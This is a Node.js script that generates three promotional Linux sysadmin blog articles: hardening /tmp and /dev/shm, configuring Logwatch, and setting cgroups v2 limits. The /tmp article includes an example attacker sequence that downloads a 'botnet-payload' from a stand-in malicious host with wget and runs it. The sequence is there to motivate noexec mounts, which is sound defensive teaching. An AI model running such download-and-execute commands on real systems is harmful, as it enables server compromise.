const fs = require('fs');
const path = require('path');

const ROOT_DIR = path.resolve(__dirname, '..');
const BLOG_DIR = path.join(ROOT_DIR, 'blog');

const articles = [
  {
    filename: 'how-to-secure-tmp-dev-shm-fstab-guide.html',
    title: 'How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)',
    metaTitle: 'How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)',
    metaDesc: 'Harden Linux temporary directories against malware and privilege escalation. Learn /etc/fstab mount options nosuid, noexec, nodev, and CIS compliance.',
    canonicalUrl: 'https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html',
    publishDate: '2026-11-16',
    modifiedDate: '2026-11-16',
    category: 'Security & Hardening',
    readTime: '11 min read',
    h1: 'How to Secure /tmp, /var/tmp, and /dev/shm on Linux: 2026 Hardening Guide',
    faqs: [
      {
        q: 'Why are /tmp and /dev/shm prime targets for Linux malware and attackers?',
        a: 'Because temporary directories require world-writable permissions (1777 / sticky bit) so any process can create temp files. Attackers exploit this to download malicious payloads or compile root exploits. Restricting execution with noexec prevents binaries and scripts from running directly inside /tmp.'
      },
      {
        q: 'What do the nosuid, noexec, and nodev mount flags do?',
        a: 'nosuid disables SetUID and SetGID execution, preventing privilege escalation. noexec prevents execution of any binaries or scripts residing on that partition. nodev blocks the operating system from creating or interpreting block or character special device files.'
      },
      {
        q: 'Will mounting /tmp with noexec break package managers like apt or yum/dnf?',
        a: 'Certain package managers execute temporary scripts during upgrades or kernel builds. If an upgrade fails due to noexec, temporarily remount /tmp with execution privileges (sudo mount -o remount,exec /tmp), perform the upgrade, and remount it with noexec.'
      }
    ],
    content: `
      <p class="blog-lead">
        Under standard Linux installations, <code>/tmp</code> and <code>/dev/shm</code> (shared memory) are world-writable directories accessible to every system user and daemon. When web applications (such as WordPress, PHP-FPM, or Python web servers) suffer remote code execution or file upload vulnerabilities, attackers routinely stage reverse shells and rootkits in <code>/tmp</code>. Hardening these partitions with <strong>nosuid</strong>, <strong>noexec</strong>, and <strong>nodev</strong> is a core CIS Benchmark and PCI-DSS compliance requirement.
      </p>

      <h2>The Dangerous Nature of World-Writable Directories</h2>
      <p>
        By design, temporary directories have permissions set to <code>1777</code> (<code>drwxrwxrwt</code>), allowing any local user or unprivileged service account to create and write files. If attackers achieve an arbitrary file upload, their immediate next step is executing a binary payload:
      </p>
      <pre><code># Attackers routinely execute binaries directly from /tmp
cd /tmp
wget https://malicious-host.xyz/botnet-payload -O agent
chmod +x agent
./agent &amp;</code></pre>
      <p>
        Mounting <code>/tmp</code> with the <code>noexec</code> flag completely neutralizes this attack vector by blocking kernel syscall execution on any file within the mount point.
      </p>

      <h2>Step 1: Check Current Mount Status</h2>
      <p>Inspect existing mount options for temporary filesystems:</p>
      <pre><code>mount | grep -E "( /tmp | /dev/shm )"
df -h /tmp /dev/shm</code></pre>
      <p>
        If <code>/tmp</code> is merely a directory on the root partition rather than an isolated mount point, you must mount it as a dedicated filesystem or tmpfs.
      </p>

      <h2>Step 2: Harden /tmp Using systemd or tmpfs</h2>
      <p>
        Modern Linux distributions (Ubuntu 22.04+, Debian 12, RHEL 9, Rocky Linux) manage <code>/tmp</code> as a RAM-backed <code>tmpfs</code> via systemd. Enable and secure it:
      </p>
      <pre><code># Copy systemd tmp mount template
sudo cp /usr/share/systemd/tmp.mount /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now tmp.mount</code></pre>
      <p>
        To enforce strict security flags, edit <code>/etc/systemd/system/tmp.mount</code> or define them in <code>/etc/fstab</code>:
      </p>
      <pre><code>sudo nano /etc/fstab</code></pre>
      <p>Add the hardened <code>/tmp</code> line:</p>
      <pre><code># Secure /tmp with tmpfs
tmpfs   /tmp   tmpfs   rw,nosuid,nodev,noexec,relatime,size=2G   0  0</code></pre>

      <h2>Step 3: Secure /var/tmp with Bind Mount</h2>
      <p>
        <code>/var/tmp</code> is used for temporary files that persist across reboots. Rather than maintaining a separate partition, bind mount <code>/var/tmp</code> to point to <code>/tmp</code> in <code>/etc/fstab</code>:
      </p>
      <pre><code># Bind mount /var/tmp to /tmp to inherit security flags
/tmp   /var/tmp   none   bind,nosuid,nodev,noexec   0  0</code></pre>

      <h2>Step 4: Harden /dev/shm (Shared Memory)</h2>
      <p>
        <code>/dev/shm</code> provides POSIX shared memory. While processes need to read and write shared memory segments, they rarely need to execute compiled binaries directly from it. Update <code>/dev/shm</code> in <code>/etc/fstab</code>:
      </p>
      <pre><code># Secure POSIX shared memory
tmpfs   /dev/shm   tmpfs   rw,nosuid,nodev,noexec   0  0</code></pre>

      <h2>Step 5: Apply Mount Options and Verify Execution Block</h2>
      <p>Apply the new mounts without rebooting:</p>
      <pre><code>sudo mount -o remount /tmp
sudo mount -o remount /dev/shm
sudo mount -a</code></pre>
      <p>
        Verify that execution is strictly forbidden by compiling or running a test script inside <code>/tmp</code>:
      </p>
      <pre><code>echo '#!/bin/bash' &gt; /tmp/test-script.sh
echo 'echo "Execution allowed!"' &gt;&gt; /tmp/test-script.sh
chmod +x /tmp/test-script.sh

/tmp/test-script.sh</code></pre>
      <p>Expected secure response from the Linux kernel:</p>
      <pre><code>-bash: /tmp/test-script.sh: Permission denied</code></pre>

      <h2>Audit Security and Storage Visually with SSH Desktop</h2>
      <p>
        Keeping track of partition mounts, filesystem permissions, and rogue background processes across multiple production servers is simple with <strong>SSH Desktop</strong>:
      </p>
      <ul>
        <li><strong>Visual Disk Manager:</strong> Monitor partition usage, mount points, and filesystem flags across all servers in one unified dashboard.</li>
        <li><strong>Security Auditor:</strong> Automatically verify CIS benchmark compliance, including <code>nosuid</code> and <code>noexec</code> mount flags.</li>
        <li><strong>Live Process Manager:</strong> Detect and terminate unapproved processes attempting to run from non-standard directories.</li>
      </ul>
      <p>
        Explore our <a href="../linux-disk-manager.html">Linux Disk Manager</a> and <a href="../linux-security-auditor.html">Linux Security Auditor</a>.
      </p>
    `
  },
  {
    filename: 'how-to-configure-logwatch-daily-reports-linux.html',
    title: 'How to Configure Logwatch for Daily Linux Email Reports (2026 Guide)',
    metaTitle: 'How to Configure Logwatch for Daily Linux Email Reports (2026 Guide)',
    metaDesc: 'Automate server log auditing with Logwatch on Linux. Configure daily email digests for SSH logins, failed sudo attempts, disk alerts, and firewall events.',
    canonicalUrl: 'https://sshdesktop.com/blog/how-to-configure-logwatch-daily-reports-linux.html',
    publishDate: '2026-11-16',
    modifiedDate: '2026-11-16',
    category: 'Monitoring & Logs',
    readTime: '10 min read',
    h1: 'How to Configure Logwatch for Daily Linux Email Reports: 2026 Guide',
    faqs: [
      {
        q: 'What is Logwatch and how does it differ from real-time log monitors?',
        a: 'Logwatch is a modular log parsing utility that analyzes system logs over a 24-hour window and compiles a categorized, high-level executive summary. Unlike real-time streaming tools that trigger alert fatigue, Logwatch sends an organized daily digest highlighting security anomalies, failed logins, and disk warnings.'
      },
      {
        q: 'How does Logwatch send email notifications from a server without an SMTP server?',
        a: 'Logwatch utilizes the local system mail transfer agent (MTA) such as Postfix or lightweight relay clients like msmtp or ssmtp configured with third-party SMTP services (e.g., SendGrid, AWS SES, or Gmail).'
      },
      {
        q: 'Can I customize Logwatch detail levels and specific services to monitor?',
        a: 'Yes. Detail levels range from Low (0) to High (10). You can monitor all services or restrict reports to specific critical daemons such as sshd, sudo, ufw, and fail2ban by editing /etc/logwatch/conf/logwatch.conf.'
      }
    ],
    content: `
      <p class="blog-lead">
        Reviewing raw server logs across gigabytes of journal entries every morning is impractical for system administrators. However, ignoring logs leaves brute-force SSH attacks, kernel disk warnings, and unauthorized sudo attempts undetected. <strong>Logwatch</strong> is an open-source log analyzer that parses your server logs and generates an organized, human-readable daily email digest. Learn how to configure Logwatch on Linux in 2026.
      </p>

      <h2>What Logwatch Summarizes Every Morning</h2>
      <ul>
        <li><strong>SSH Authentication:</strong> Successful root logins, accepted public keys, and top IP addresses attempting brute-force logins.</li>
        <li><strong>Sudo &amp; PAM Activity:</strong> Every user executing administrative commands and any failed privilege escalation attempts.</li>
        <li><strong>Firewall &amp; Fail2ban:</strong> Number of blocked connection attempts, banned IP addresses, and dropped port scans.</li>
        <li><strong>Disk Space &amp; Storage:</strong> Partitions exceeding capacity thresholds and filesystem errors.</li>
        <li><strong>Package Updates:</strong> Software packages installed, upgraded, or removed.</li>
      </ul>

      <h2>Step 1: Install Logwatch and Mail Utilities</h2>
      <p>Install Logwatch on Ubuntu / Debian:</p>
      <pre><code>sudo apt update
sudo apt install -y logwatch mailutils</code></pre>
      <p>On RHEL / AlmaLinux / Rocky Linux:</p>
      <pre><code>sudo dnf install -y epel-release
sudo dnf install -y logwatch mailx</code></pre>

      <h2>Step 2: Configure Logwatch Settings</h2>
      <p>
        The default configuration resides in <code>/usr/share/logwatch/default.conf/logwatch.conf</code>. Never edit this default file directly; instead, create a local override at <code>/etc/logwatch/conf/logwatch.conf</code>:
      </p>
      <pre><code>sudo nano /etc/logwatch/conf/logwatch.conf</code></pre>
      <p>Insert your customized monitoring configuration:</p>
      <pre><code># Email recipient for reports
MailTo = admin@example.com

# Sender email address
MailFrom = server01-logwatch@example.com

# Format: text or html
Format = html

# Report detail level: Low (0), Medium (5), High (10)
Detail = High

# Timeframe to analyze: Yesterday or Today
Range = yesterday

# Services to monitor: 'All' or specific services like sshd, sudo, ufw
Service = All</code></pre>

      <h2>Step 3: Test Logwatch Execution Manually</h2>
      <p>Generate a test report to verify configuration and output:</p>
      <pre><code># Output summary directly to the terminal
sudo logwatch --detail High --range yesterday --output stdout

# Send a test email digest immediately
sudo logwatch --mailto admin@example.com --range yesterday</code></pre>

      <h2>Step 4: Configure Postfix or msmtp Relay</h2>
      <p>
        If your server does not have an external MX record, install <code>msmtp</code> to relay emails through an authenticated SMTP provider:
      </p>
      <pre><code>sudo apt install -y msmtp msmtp-mta</code></pre>
      <p>Configure <code>/etc/msmtprc</code>:</p>
      <pre><code>defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /var/log/msmtp.log

account        default
host           smtp.sendgrid.net
port           587
from           alerts@yourdomain.com
user           apikey
password       YOUR_SENDGRID_API_KEY</code></pre>

      <h2>Step 5: Verify the Automated Daily Cron Schedule</h2>
      <p>
        Upon installation, Logwatch automatically registers a daily cron script in <code>/etc/cron.daily/00logwatch</code>. Verify that the script exists and is executable:
      </p>
      <pre><code>ls -la /etc/cron.daily/00logwatch</code></pre>
      <p>
        Every morning at your server's standard cron hour (typically 06:25 AM), Logwatch will parse the previous day's events and deliver an actionable summary directly to your inbox.
      </p>

      <h2>Remote Log Analysis &amp; Inspection with SSH Desktop</h2>
      <p>
        While daily email digests provide excellent high-level summaries, investigating active incidents requires interactive, real-time log inspection. <strong>SSH Desktop</strong> makes log analysis seamless:
      </p>
      <ul>
        <li><strong>Remote Log Analysis Grep:</strong> Search, filter, and tail <code>journalctl</code> and application logs across multiple servers simultaneously.</li>
        <li><strong>Crontab GUI Manager:</strong> View, test, and schedule recurring maintenance tasks and reporting jobs without terminal syntax errors.</li>
        <li><strong>System Monitoring Telemetry:</strong> Keep visual tabs on CPU spikes, memory leaks, and disk write surges in real time.</li>
      </ul>
      <p>
        Explore our <a href="../log-analysis-grep.html">Remote Log Analyzer</a> and <a href="../crontab-gui.html">Crontab GUI Manager</a>.
      </p>
    `
  },
  {
    filename: 'how-to-limit-process-cpu-memory-systemd-cgroups-guide.html',
    title: 'How to Limit Process CPU & Memory with Systemd Cgroups v2 (2026 Guide)',
    metaTitle: 'How to Limit Process CPU & Memory with Systemd Cgroups v2 (2026 Guide)',
    metaDesc: 'Prevent memory leaks and runaway processes from freezing Linux servers. Learn cgroups v2, systemd resource limits MemoryMax, CPUQuota, and OOMScoreAdjust.',
    canonicalUrl: 'https://sshdesktop.com/blog/how-to-limit-process-cpu-memory-systemd-cgroups-guide.html',
    publishDate: '2026-11-16',
    modifiedDate: '2026-11-16',
    category: 'Performance & DevOps',
    readTime: '12 min read',
    h1: 'How to Limit Process CPU & Memory with Systemd Cgroups v2: 2026 Guide',
    faqs: [
      {
        q: 'What is the advantage of using Systemd Cgroups v2 over older ulimit commands?',
        a: 'ulimit commands only apply limits to individual processes within a single user session shell. If a process spawns child processes or forks background daemons, ulimit fails to constrain aggregate usage. Systemd with Cgroups v2 enforces hierarchical resource boundaries across entire service trees, including all sub-processes and worker threads.'
      },
      {
        q: 'What happens when a service exceeds its MemoryMax allocation?',
        a: 'When a service exceeds its MemoryMax threshold, the Linux kernel Out-Of-Memory (OOM) killer selectively terminates processes within that specific cgroup control slice without crashing the host operating system or terminating other critical services like sshd or databases.'
      },
      {
        q: 'How does CPUQuota calculate percentages for multi-core CPUs?',
        a: 'CPUQuota represents total CPU compute time per scheduling window. 100% corresponds to 1 full CPU core. If your server has 4 CPU cores, setting CPUQuota=200% restricts the service to a maximum of 2 full cores of processing capacity.'
      }
    ],
    content: `
      <p class="blog-lead">
        A single rogue background worker, memory-leaking Node.js process, or runaway batch script can consume 100% of your server's RAM, triggering the Linux kernel OOM (Out of Memory) killer to randomly terminate essential services like <code>sshd</code>, <code>nginx</code>, or <code>mysqld</code>. Modern Linux distributions solve this with <strong>Control Groups v2 (cgroups v2)</strong> integrated natively into <strong>systemd</strong>. Learn how to enforce strict CPU and memory limits in 2026.
      </p>

      <h2>Why Legacy ulimit and nice Are Obsolete</h2>
      <p>
        Traditional Unix tools like <code>ulimit</code> and <code>nice</code> operate on individual PID boundaries. If an application (such as Chromium, Celery, or Node.js cluster) forks 20 child workers, each child inherits a separate limit, quickly multiplying total memory consumption. 
        <strong>Cgroups v2</strong> groups all parent and child processes into a single unified accounting slice, guaranteeing that total collective consumption never exceeds your configured caps.
      </p>

      <h2>Step 1: Verify Cgroups v2 Support</h2>
      <p>Check if your Linux server is running unified cgroups v2:</p>
      <pre><code>stat -fc %T /sys/fs/cgroup/</code></pre>
      <p>
        If the output is <code>cgroup2fs</code>, your system is using cgroups v2.
      </p>

      <h2>Step 2: Inspect Real-Time Resource Usage with systemd-cgtop</h2>
      <p>Monitor live CPU, memory, and I/O consumption by cgroup slice:</p>
      <pre><code>systemd-cgtop --order=memory</code></pre>

      <h2>Step 3: Apply Memory and CPU Limits to an Existing Service</h2>
      <p>
        Suppose you have a background worker or API service named <code>worker.service</code>. To limit its maximum memory to 1.5GB and CPU usage to 1.5 cores (150%):
      </p>
      <pre><code>sudo systemctl set-property worker.service MemoryMax=1.5G MemoryHigh=1.2G CPUQuota=150%</code></pre>
      <div class="blog-tip-box">
        <strong>Pro Tip:</strong> <code>MemoryHigh</code> acts as a throttling throttle. When exceeded, the kernel throttles the processes I/O and aggressively reclaims page cache before hard-killing the service at <code>MemoryMax</code>.
      </div>

      <h2>Step 4: Configure Persistent Resource Limits in Unit Files</h2>
      <p>
        You can also declare resource controls directly inside your service unit file (e.g., <code>/etc/systemd/system/myapp.service</code>):
      </p>
      <pre><code>[Unit]
Description=High Load API Worker Service
After=network.target

[Service]
Type=simple
User=appuser
ExecStart=/usr/bin/node /opt/myapp/server.js
Restart=always

# Cgroups v2 Resource Constraints
CPUAccounting=yes
CPUQuota=100%             # Restrict service to maximum 1 CPU core

MemoryAccounting=yes
MemoryHigh=750M           # Begin aggressive page cache reclamation
MemoryMax=1G              # Hard ceiling (OOM killer intervenes if exceeded)

TasksMax=250              # Prevent fork-bomb attacks

# Protect service against host-wide OOM kills
OOMScoreAdjust=-500

[Install]
WantedBy=multi-user.target</code></pre>
      <p>Reload systemd and restart the service:</p>
      <pre><code>sudo systemctl daemon-reload
sudo systemctl restart myapp.service</code></pre>

      <h2>Step 5: Verify Active Constraints</h2>
      <p>Inspect the running service properties to confirm cgroup limits:</p>
      <pre><code>systemctl show myapp.service -p MemoryMax,MemoryHigh,CPUQuotaPerSecUSec,TasksMax</code></pre>
      <p>You can also check the kernel cgroup interface directly:</p>
      <pre><code>cat /sys/fs/cgroup/system.slice/myapp.service/memory.max
cat /sys/fs/cgroup/system.slice/myapp.service/cpu.max</code></pre>

      <h2>Manage Services and Processes Visually with SSH Desktop</h2>
      <p>
        Monitoring process trees, configuring unit limits, and restarting crashed workers across dozens of servers is fast and intuitive with <strong>SSH Desktop</strong>:
      </p>
      <ul>
        <li><strong>Visual Systemd Manager:</strong> Inspect service states, edit unit configurations, and reload daemons with one click.</li>
        <li><strong>Real-Time Process Manager:</strong> Sort processes by CPU and memory consumption, trace process parentage, and adjust priorities safely.</li>
        <li><strong>Automated Restart Policies:</strong> Configure health checks and visual alerts when services exceed resource thresholds.</li>
      </ul>
      <p>
        Explore our <a href="../systemd-gui.html">Systemd GUI Service Manager</a> and <a href="../linux-process-manager.html">Linux Process Manager</a>.
      </p>
    `
  }
];

function generateHtml(article) {
  const faqSchema = article.faqs.map(faq => ({
    "@type": "Question",
    "name": faq.q,
    "acceptedAnswer": {
      "@type": "Answer",
      "text": faq.a
    }
  }));

  const schemaJson = JSON.stringify({
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "TechArticle",
        "@id": `${article.canonicalUrl}#article`,
        "isPartOf": {
          "@type": "WebPage",
          "@id": article.canonicalUrl,
          "url": article.canonicalUrl,
          "name": article.metaTitle,
          "description": article.metaDesc
        },
        "headline": article.h1,
        "description": article.metaDesc,
        "inLanguage": "en-US",
        "datePublished": `${article.publishDate}T08:00:00+00:00`,
        "dateModified": `${article.modifiedDate}T08:00:00+00:00`,
        "mainEntityOfPage": article.canonicalUrl,
        "author": {
          "@type": "Organization",
          "name": "SSH Desktop Team",
          "url": "https://sshdesktop.com"
        },
        "publisher": {
          "@type": "Organization",
          "name": "SSH Desktop",
          "url": "https://sshdesktop.com",
          "logo": {
            "@type": "ImageObject",
            "url": "https://sshdesktop.com/assets/images/favicon.svg"
          }
        },
        "image": {
          "@type": "ImageObject",
          "url": "https://sshdesktop.com/assets/images/og-image.png",
          "width": 1200,
          "height": 630
        }
      },
      {
        "@type": "BreadcrumbList",
        "@id": `${article.canonicalUrl}#breadcrumb`,
        "itemListElement": [
          {
            "@type": "ListItem",
            "position": 1,
            "name": "Home",
            "item": "https://sshdesktop.com/"
          },
          {
            "@type": "ListItem",
            "position": 2,
            "name": "Blog",
            "item": "https://sshdesktop.com/blog/"
          },
          {
            "@type": "ListItem",
            "position": 3,
            "name": article.title,
            "item": article.canonicalUrl
          }
        ]
      },
      {
        "@type": "FAQPage",
        "@id": `${article.canonicalUrl}#faq`,
        "mainEntity": faqSchema
      }
    ]
  }, null, 2);

  const faqsHtml = article.faqs.map(faq => `
        <div class="faq-item">
          <h3 class="faq-question">${faq.q}</h3>
          <p class="faq-answer">${faq.a}</p>
        </div>`).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${article.metaTitle}</title>
  <meta name="description" content="${article.metaDesc}">
  <link rel="canonical" href="${article.canonicalUrl}">
  
  <!-- OpenGraph -->
  <meta property="og:type" content="article">
  <meta property="og:title" content="${article.metaTitle}">
  <meta property="og:description" content="${article.metaDesc}">
  <meta property="og:url" content="${article.canonicalUrl}">
  <meta property="og:image" content="https://sshdesktop.com/assets/images/og-image.png">
  <meta property="og:site_name" content="SSH Desktop">
  <meta property="article:published_time" content="${article.publishDate}T08:00:00+00:00">
  <meta property="article:modified_time" content="${article.modifiedDate}T08:00:00+00:00">
  
  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${article.metaTitle}">
  <meta name="twitter:description" content="${article.metaDesc}">
  <meta name="twitter:image" content="https://sshdesktop.com/assets/images/og-image.png">

  <!-- Icons -->
  <link rel="icon" type="image/svg+xml" href="../assets/images/favicon.svg">
  <link rel="icon" type="image/png" sizes="32x32" href="../assets/images/favicon-32x32.png">
  <link rel="apple-touch-icon" sizes="180x180" href="../assets/images/apple-touch-icon.png">

  <!-- CSS -->
  <link rel="stylesheet" href="../assets/css/style.min.css">

  <!-- JSON-LD Structured Data -->
  <script type="application/ld+json">
${schemaJson}
  </script>
</head>
<body class="bg-slate-900 text-slate-100 font-sans antialiased">
  <!-- Navigation Header -->
  <header class="blog-nav-header">
    <div class="blog-nav-container">
      <a href="../index.html" class="blog-nav-logo">
        <img src="../assets/images/favicon.svg" alt="SSH Desktop Logo" width="32" height="32" class="blog-logo-img">
        <span>SSH Desktop</span>
      </a>
      <nav class="blog-nav-links">
        <a href="../features.html">Features</a>
        <a href="../docs.html">Docs</a>
        <a href="index.html" class="active">Blog</a>
        <a href="../download.html" class="blog-btn-cta">Download App</a>
      </nav>
    </div>
  </header>

  <!-- Main Article Body -->
  <main class="blog-article-wrapper">
    <!-- Breadcrumb -->
    <nav class="blog-breadcrumb" aria-label="Breadcrumb">
      <ol>
        <li><a href="../index.html">Home</a></li>
        <li><a href="index.html">Blog</a></li>
        <li aria-current="page">${article.title}</li>
      </ol>
    </nav>

    <article class="blog-post-content">
      <header class="blog-post-header">
        <div class="blog-post-meta">
          <span class="blog-post-tag">${article.category}</span>
          <time datetime="${article.publishDate}">${article.publishDate}</time>
          <span>&bull;</span>
          <span>${article.readTime}</span>
        </div>
        <h1 class="blog-post-h1">${article.h1}</h1>
      </header>

      <div class="blog-post-body">
        ${article.content}

        <h2>Frequently Asked Questions</h2>
        <div class="faq-accordion">
          ${faqsHtml}
        </div>

        <!-- Conversion Card -->
        <div class="blog-cta-box">
          <h3>Manage Linux Servers with Visual Simplicity</h3>
          <p>
            Tired of juggling terminal windows and typing repetitive commands? SSH Desktop combines an ultra-fast terminal with native SFTP, background tunnels, visual reverse proxy management, and real-time system monitoring.
          </p>
          <a href="../download.html" class="blog-cta-button">Download SSH Desktop Free &rarr;</a>
        </div>
      </div>
    </article>
  </main>

  <!-- Footer -->
  <footer class="blog-footer">
    <div class="blog-footer-container">
      <p>&copy; 2026 SSH Desktop. All rights reserved. Free, open, and privacy-focused Linux management.</p>
      <div class="blog-footer-links">
        <a href="../privacy.html">Privacy Policy</a>
        <a href="../terms.html">Terms of Service</a>
        <a href="../contact.html">Contact Us</a>
      </div>
    </div>
  </footer>
</body>
</html>`;
}

articles.forEach(article => {
  const filePath = path.join(BLOG_DIR, article.filename);
  const html = generateHtml(article);
  fs.writeFileSync(filePath, html, 'utf8');
  console.log(`Created: ${filePath} (${html.length} bytes)`);
});
